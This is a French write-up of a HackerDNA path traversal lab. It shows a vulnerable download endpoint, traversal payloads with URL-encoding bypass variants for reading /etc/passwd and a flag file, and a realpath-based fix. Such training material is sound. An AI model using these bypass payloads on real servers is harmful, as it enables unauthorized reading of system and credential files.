# Writeup — Path Traversal

Plateforme : HackerDNA
Lien : https://hackerdna.com/labs/path-traversal
Catégorie : Sécurité Web & API / Path Traversal
Difficulté : Intermédiaire
Objectif : Exploiter une traversée de répertoire pour lire un fichier sensible et récupérer le flag

---

## 1. Contexte

L'application expose un endpoint de téléchargement de fichiers qui prend un
nom de fichier en paramètre et le lit depuis un répertoire dédié.

Exemple :

GET /download?file=rapport.pdf HTTP/1.1
Host: cible

Le serveur construit le chemin par concaténation :

path = "/var/www/uploads/" + file
open(path).read()

Aucune validation du paramètre file n'est effectuée : les séquences
../ ne sont pas filtrées, permettant de remonter l'arborescence.

---

## 2. Détection

On teste d'abord un fichier légitime pour vérifier le comportement normal :

GET /download?file=rapport.pdf  → 200, contenu du PDF

On injecte ensuite une séquence de traversée :

GET /download?file=../../../../etc/passwd

Observation : le serveur renvoie le contenu de /etc/passwd.
La faille est confirmée : le paramètre file est vulnérable au Path Traversal.

Si les ../ sont filtrés en surface, on teste les variantes d'encodage :

..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd

---

## 3. Exploitation

### Étape 1 — Localiser le fichier cible

On cherche le flag aux emplacements courants :

GET /download?file=../../../../flag.txt
GET /download?file=../../../../flag
GET /download?file=../../../../root/flag.txt
GET /download?file=../../../../home/user/flag.txt

### Étape 2 — Lire le fichier

Payload final :

GET /download?file=../../../../flag.txt HTTP/1.1
Host: cible

La réponse contient le contenu du fichier flag.

### Variante — Traversée absolue

Si le serveur accepte les chemins absolus :

GET /download?file=/etc/passwd
GET /download?file=/flag.txt

---

## 4. Cause racine

Le paramètre file est concaténé directement au répertoire de base sans
normalisation ni validation :

path = base_dir + user_input
open(path)

L'absence de canonicalisation (realpath) et de vérification que le chemin
résolu reste dans le répertoire autorisé permet de sortir de la racine
prévue et de lire n'importe quel fichier accessible au processus.

---

## 5. Remédiation

- Normaliser le chemin avec realpath() puis vérifier qu'il commence par
  le répertoire de base autorisé :

  base = os.path.realpath("/var/www/uploads")
  target = os.path.realpath(os.path.join(base, user_input))
  if not target.startswith(base + os.sep):
      raise PermissionError

- Ne jamais concaténer l'entrée utilisateur à un chemin.
- Utiliser un identifiant de fichier (ID en base) plutôt qu'un nom contrôlé
  par le client.
- Restreindre les permissions du processus (privilèges minimaux).
- Filtrer les séquences ../ et leurs encodages en défense en profondeur,
  sans en faire la seule protection.

---

## 6. Leçons retenues

- Les séquences ../, les encodages URL (%2f, %252f) et les variantes
  (....//, ..%c0%af) doivent toutes être testées.
- La protection fiable repose sur la canonicalisation + vérification
  du préfixe, pas sur un simple filtre de chaînes.
- Un endpoint de téléchargement est un point d'entrée classique pour
  le Path Traversal et la lecture de fichiers sensibles.

---
